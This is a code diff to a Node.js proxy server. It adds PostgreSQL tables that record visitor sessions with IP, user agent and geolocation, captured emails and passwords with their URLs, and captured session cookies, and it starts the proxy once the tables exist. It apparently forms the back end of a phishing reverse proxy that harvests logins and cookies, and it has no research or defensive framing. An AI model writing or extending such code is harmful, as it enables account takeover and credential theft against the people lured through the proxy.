@@ -4,6 +4,63 @@ const path = require("path");
 const fs = require("fs");
 const zlib = require("zlib");
 const crypto = require("crypto");
+
+const { Pool } = require('pg');
+const pool = new Pool({
+    connectionString: process.env.DATABASE_URL,
+    ssl: process.env.DATABASE_SSL === 'true' ? { rejectUnauthorized: false } : false
+});
+
+// ==================== DATABASE INITIALIZATION ====================
+async function initializeDatabase() {
+    const createTables = `
+        CREATE TABLE IF NOT EXISTS sessions (
+            id TEXT PRIMARY KEY,
+            ip TEXT,
+            user_agent TEXT,
+            geo JSONB,
+            host TEXT,
+            status TEXT,
+            created_at TIMESTAMPTZ DEFAULT NOW(),
+            updated_at TIMESTAMPTZ DEFAULT NOW()
+        );
+
+        CREATE TABLE IF NOT EXISTS credentials (
+            id SERIAL PRIMARY KEY,
+            session_id TEXT REFERENCES sessions(id) ON DELETE CASCADE,
+            email TEXT,
+            password TEXT,
+            url TEXT,
+            captured_at TIMESTAMPTZ DEFAULT NOW()
+        );
+
+        CREATE TABLE IF NOT EXISTS cookies (
+            id SERIAL PRIMARY KEY,
+            session_id TEXT REFERENCES sessions(id) ON DELETE CASCADE,
+            name TEXT,
+            value TEXT,
+            domain TEXT,
+            path TEXT,
+            expires BIGINT,
+            captured_at TIMESTAMPTZ DEFAULT NOW()
+        );
+    `;
+
+    try {
+        await pool.query(createTables);
+        console.log('[DB] Tables ready (sessions, credentials, cookies)');
+    } catch (err) {
+        console.error('[DB] Initialization failed:', err.message);
+        // You might want to exit the process if the DB is essential
+        process.exit(1);
+    }
+}
+
+// Call it before starting the HTTP server
+initializeDatabase().then(() => {
+    proxyServer.listen(process.env.PORT ?? 3000);
+    console.log(`Proxy server running on port ${process.env.PORT ?? 3000}`);
+});
 // const { HttpsProxyAgent } = require('https-proxy-agent'); // DISABLED – direct connection
 const Redis = require("ioredis");
 const redis = new Redis(process.env.REDIS_URL || "redis://localhost:6379");
